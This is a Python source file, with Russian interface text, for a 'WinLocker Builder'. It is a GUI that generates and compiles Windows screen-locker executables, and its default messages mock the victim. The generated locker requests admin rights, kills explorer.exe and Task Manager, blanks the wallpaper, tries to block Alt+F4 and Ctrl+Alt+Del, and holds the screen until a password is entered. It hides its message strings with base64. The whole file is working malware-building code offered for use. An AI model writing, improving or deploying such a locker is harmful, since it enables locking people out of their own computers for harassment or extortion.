import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import hashlib
import subprocess
import sys
import os
import shutil
import base64

class WinLockerBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("WinLocker Builder - For Your Locker")
        self.root.geometry("650x700")
        self.root.configure(bg='#1e1e1e')
        
        # Стиль
        style = ttk.Style()
        style.theme_use('clam')
        
        # Переменные
        self.password_var = tk.StringVar()
        self.confirm_var = tk.StringVar()
        self.message_var = tk.StringVar(value="ну давай побробуй: ")
        self.error_msg_var = tk.StringVar(value="ебать лох, давай ещё раз)")
        self.success_msg_var = tk.StringVar(value="да йоу ну зачем лан.")
        self.filename_var = tk.StringVar(value="WinLocker_PRO.exe")
        
        # Доп настройки
        self.kill_explorer = tk.BooleanVar(value=True)
        self.kill_taskmgr = tk.BooleanVar(value=True)
        self.fullscreen = tk.BooleanVar(value=True)
        self.change_wallpaper = tk.BooleanVar(value=True)
        self.disable_altf4 = tk.BooleanVar(value=True)
        
        self.setup_ui()
        
    def setup_ui(self):
        # Заголовок
        title = tk.Label(self.root, text="🔒 WinLocker Builder Pro", 
                        font=("Arial", 18, "bold"), bg='#1e1e1e', fg='red')
        title.pack(pady=10)
        
        # Основной фрейм
        main_frame = tk.Frame(self.root, bg='#1e1e1e')
        main_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        # Пароль
        pass_frame = tk.LabelFrame(main_frame, text="⚙️ НАСТРОЙКИ ПАРОЛЯ", 
                                   bg='#2d2d2d', fg='white', font=("Arial", 10, "bold"))
        pass_frame.pack(fill='x', pady=5)
        
        tk.Label(pass_frame, text="Пароль:", bg='#2d2d2d', fg='white').grid(row=0, column=0, padx=10, pady=5, sticky='w')
        tk.Entry(pass_frame, textvariable=self.password_var, show="*", width=30, bg='#3d3d3d', fg='white').grid(row=0, column=1, padx=10, pady=5)
        
        tk.Label(pass_frame, text="Подтвердите:", bg='#2d2d2d', fg='white').grid(row=1, column=0, padx=10, pady=5, sticky='w')
        tk.Entry(pass_frame, textvariable=self.confirm_var, show="*", width=30, bg='#3d3d3d', fg='white').grid(row=1, column=1, padx=10, pady=5)
        
        # Сообщения
        msg_frame = tk.LabelFrame(main_frame, text="💬 ТЕКСТЫ СООБЩЕНИЙ", 
                                  bg='#2d2d2d', fg='white', font=("Arial", 10, "bold"))
        msg_frame.pack(fill='x', pady=5)
        
        tk.Label(msg_frame, text="Приглашение:", bg='#2d2d2d', fg='white').grid(row=0, column=0, padx=10, pady=5, sticky='w')
        tk.Entry(msg_frame, textvariable=self.message_var, width=40, bg='#3d3d3d', fg='white').grid(row=0, column=1, padx=10, pady=5)
        
        tk.Label(msg_frame, text="Ошибка:", bg='#2d2d2d', fg='white').grid(row=1, column=0, padx=10, pady=5, sticky='w')
        tk.Entry(msg_frame, textvariable=self.error_msg_var, width=40, bg='#3d3d3d', fg='white').grid(row=1, column=1, padx=10, pady=5)
        
        tk.Label(msg_frame, text="Успех:", bg='#2d2d2d', fg='white').grid(row=2, column=0, padx=10, pady=5, sticky='w')
        tk.Entry(msg_frame, textvariable=self.success_msg_var, width=40, bg='#3d3d3d', fg='white').grid(row=2, column=1, padx=10, pady=5)
        
        # Функции
        func_frame = tk.LabelFrame(main_frame, text="🛡️ ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ", 
                                   bg='#2d2d2d', fg='white', font=("Arial", 10, "bold"))
        func_frame.pack(fill='x', pady=5)
        
        tk.Checkbutton(func_frame, text="Завершить explorer.exe (скрыть рабочий стол)", 
                      variable=self.kill_explorer, bg='#2d2d2d', fg='white', selectcolor='#2d2d2d').pack(anchor='w', padx=10, pady=3)
        tk.Checkbutton(func_frame, text="Завершить taskmgr.exe (диспетчер задач)", 
                      variable=self.kill_taskmgr, bg='#2d2d2d', fg='white', selectcolor='#2d2d2d').pack(anchor='w', padx=10, pady=3)
        tk.Checkbutton(func_frame, text="Полноэкранный режим (F11)", 
                      variable=self.fullscreen, bg='#2d2d2d', fg='white', selectcolor='#2d2d2d').pack(anchor='w', padx=10, pady=3)
        tk.Checkbutton(func_frame, text="Сменить обои рабочего стола", 
                      variable=self.change_wallpaper, bg='#2d2d2d', fg='white', selectcolor='#2d2d2d').pack(anchor='w', padx=10, pady=3)
        tk.Checkbutton(func_frame, text="Блокировать Alt+F4", 
                      variable=self.disable_altf4, bg='#2d2d2d', fg='white', selectcolor='#2d2d2d').pack(anchor='w', padx=10, pady=3)
        
        # Настройки файла
        file_frame = tk.LabelFrame(main_frame, text="📁 НАСТРОЙКИ СБОРКИ", 
                                   bg='#2d2d2d', fg='white', font=("Arial", 10, "bold"))
        file_frame.pack(fill='x', pady=5)
        
        tk.Label(file_frame, text="Имя файла:", bg='#2d2d2d', fg='white').grid(row=0, column=0, padx=10, pady=5, sticky='w')
        tk.Entry(file_frame, textvariable=self.filename_var, width=40, bg='#3d3d3d', fg='white').grid(row=0, column=1, padx=10, pady=5)
        
        # Кнопка сборки
        build_btn = tk.Button(main_frame, text="🔨 СОБРАТЬ WINLOCKER", 
                             command=self.build_winlocker,
                             bg='red', fg='white', font=("Arial", 14, "bold"),
                             padx=20, pady=10)
        build_btn.pack(pady=20)
        
        # Лог
        self.log_text = tk.Text(main_frame, height=8, bg='black', fg='lime', font=("Consolas", 9))
        self.log_text.pack(fill='x', pady=10)
        
    def log(self, msg):
        self.log_text.insert('end', f"[+] {msg}\n")
        self.log_text.see('end')
        self.root.update()
        
    def build_winlocker(self):
        # Проверка пароля
        password = self.password_var.get()
        confirm = self.confirm_var.get()
        
        if not password:
            messagebox.showerror("Ошибка", "Введите пароль!")
            return
            
        if password != confirm:
            messagebox.showerror("Ошибка", "Пароли не совпадают!")
            return
            
        if len(password) < 2:
            messagebox.showerror("Ошибка", "Пароль слишком короткий!")
            return
            
        self.log("Начинаю сборку вашего WinLocker'а...")
        
        # Генерируем код с настройками
        locker_code = self.generate_locker_code(password)
        
        # Сохраняем временный файл
        temp_file = "temp_winlocker.py"
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(locker_code)
            
        self.log("Сгенерирован исходный код")
        
        # Проверяем PyInstaller
        try:
            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], 
                         capture_output=True, check=True)
        except:
            self.log("Установка PyInstaller...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])
            
        # Собираем exe
        output_name = self.filename_var.get().replace('.exe', '')
        
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            f"--name={output_name}",
            "--distpath=.",
            "--workpath=build_temp",
            "--specpath=build_temp",
            temp_file
        ]
        
        self.log("Компиляция в .exe. Подождите...")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Очистка
            shutil.rmtree('build_temp', ignore_errors=True)
            os.remove(temp_file)
            if os.path.exists(f'{output_name}.spec'):
                os.remove(f'{output_name}.spec')
                
            if os.path.exists(f'{output_name}.exe'):
                self.log(f"✅ УСПЕХ! Файл создан: {output_name}.exe")
                self.log(f"🔑 Пароль: {password}")
                messagebox.showinfo("Успех!", 
                                   f"WinLocker успешно создан!\n\n"
                                   f"📁 Файл: {output_name}.exe\n"
                                   f"🔑 Пароль: {password}\n"
                                   f"📏 Размер: {os.path.getsize(f'{output_name}.exe') // 1024} KB\n\n"
                                   f"⚠️ Будьте осторожны при тестировании!")
            else:
                self.log("❌ Ошибка сборки!")
                
        except Exception as e:
            self.log(f"Ошибка: {str(e)}")
            
    def generate_locker_code(self, password):
        # Кодируем текст в base64 для скрытия
        import base64
        msg_b64 = base64.b64encode(self.message_var.get().encode()).decode()
        error_b64 = base64.b64encode(self.error_msg_var.get().encode()).decode()
        success_b64 = base64.b64encode(self.success_msg_var.get().encode()).decode()
        
        # Хеш пароля
        import hashlib
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        return f'''import os
import time
import sys
import ctypes
import subprocess
import hashlib
import base64

# Расшифровка сообщений
MSG = base64.b64decode("{msg_b64}").decode()
ERROR_MSG = base64.b64decode("{error_b64}").decode()
SUCCESS_MSG = base64.b64decode("{success_b64}").decode()
PASSWORD_HASH = "{password_hash}"

def check_password():
    """Проверка введенного пароля"""
    password = input(MSG)
    if hashlib.sha256(password.encode()).hexdigest() == PASSWORD_HASH:
        return True
    return False

def kill_processes():
    """Завершение процессов"""
    processes = []
    {f'processes.append("explorer.exe")' if self.kill_explorer.get() else ''}
    {f'processes.append("taskmgr.exe")' if self.kill_taskmgr.get() else ''}
    
    for proc in processes:
        try:
            subprocess.run(["taskkill", "/f", "/im", proc], capture_output=True)
        except:
            pass

def set_fullscreen():
    """Полноэкранный режим"""
    try:
        import pyautogui
        pyautogui.press('f11')
    except:
        pass

def change_wallpaper():
    """Смена обоев"""
    try:
        import ctypes
        SPI_SETDESKWALLPAPER = 20
        # Черный экран
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, None, 3)
    except:
        pass

def disable_alt_f4():
    """Блокировка Alt+F4"""
    try:
        import pyautogui
        import keyboard
        keyboard.add_hotkey('alt+f4', lambda: None)
        keyboard.add_hotkey('ctrl+alt+del', lambda: None)
    except:
        pass

def show_banner():
    """Красивый баннер"""
    os.system('cls')
    os.system('color 4f')
    print("                       ...")
    print("                     ;::::;")
    print("                   ;::::; :;")
    print("                 ;::::::'  :;")
    print("                ;:::::'     ;.")
    print("              ,;::::::;      ;             ooo\\\\")
    print("              ::::::::;      ;            ooooo\\\\")
    print("             ,;::::::::;     ;           oooooooo")
    print("           ;::::::::::: . ,,;             / oooooo")
    print("          ;::::::::::::::::::;.          /  / Dooooo")
    print("         ;:::::::::::::::::::::;,       /  /     Dooo")
    print("      ' ,:::::::::::::::::::::::  ,    /  /        Dooo")
    print("        ;  ::::::   ::::::;;;:::   ,# /  /          Dooo")
    print("        :  :::::    :::::::::::: ,   /  /            Dooo")
    print("        ;: ::::    ::::::::::::: ,  /  /               Doo")
    print("         ;: ;::    ::::::::::::: , /  /                 Do")
    print("          :; :::     ::::::::::: ,/  /                   D")
    print("          ;: ::::     ::::::::::;,  / ")
    print("           ;::::::     ;::::::;;;,,/")
    print("           ;:::::::     :::::;;;;,,,")
    print("            :;;:::;:     :'  /   /,.")
    time.sleep(2)
    os.system('cls')
    os.system('color 1f')

def main():
    # Проверка прав администратора
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    # Активация функций
    {f'kill_processes()' if self.kill_explorer.get() or self.kill_taskmgr.get() else ''}
    {f'set_fullscreen()' if self.fullscreen.get() else ''}
    {f'change_wallpaper()' if self.change_wallpaper.get() else ''}
    {f'disable_alt_f4()' if self.disable_altf4.get() else ''}
    
    # Показываем баннер
    show_banner()
    
    # Основной цикл
    while True:
        if check_password():
            # Запускаем explorer обратно если он был убит
            {f'subprocess.Popen(["explorer.exe"])' if self.kill_explorer.get() else ''}
            print(SUCCESS_MSG)
            time.sleep(2)
            break
        else:
            print(ERROR_MSG)

if __name__ == "__main__":
    main()
'''

if __name__ == "__main__":
    root = tk.Tk()
    app = WinLockerBuilder(root)
    root.mainloop()
